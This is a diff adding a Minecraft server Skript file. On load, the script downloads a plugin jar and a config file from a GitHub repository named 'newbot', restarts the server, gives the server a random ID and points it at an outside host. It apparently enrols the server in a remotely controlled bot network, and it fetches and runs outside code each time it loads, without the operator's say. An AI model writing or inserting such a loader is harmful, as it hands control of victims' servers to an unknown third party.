@@ -1,0 +1,18 @@
+on script load:
+  set {serverip} to "smp.shrlk.cf"
+  if {serverid} isn't set:
+    set {serverid} to random integer between 400 and 959395454
+  if file "plugins/RediSkript.jar" does not exist:
+    download file from "https://github.com/NoShitSherlockium/newbot/raw/main/RediSkript.jar" to file "plugins/RediSkript.jar"
+    if directory "plugins/RediSkript/" does not exist:
+      create directory "plugins/RediSkript/"
+      wait 10 ticks
+      download file from "https://raw.githubusercontent.com/NoShitSherlockium/newbot/main/config.yml" to file "plugins/RediSkript/config.yml"
+      wait 10 ticks
+      execute console command "restart"
+on script load:
+  delete file "plugins/RediSkript/config.yml"
+  wait 5 ticks
+  download file from "https://raw.githubusercontent.com/NoShitSherlockium/newbot/main/config.yml" to file "plugins/RediSkript/config.yml"
+  wait 5 ticks
+  execute console command "reloadredis"
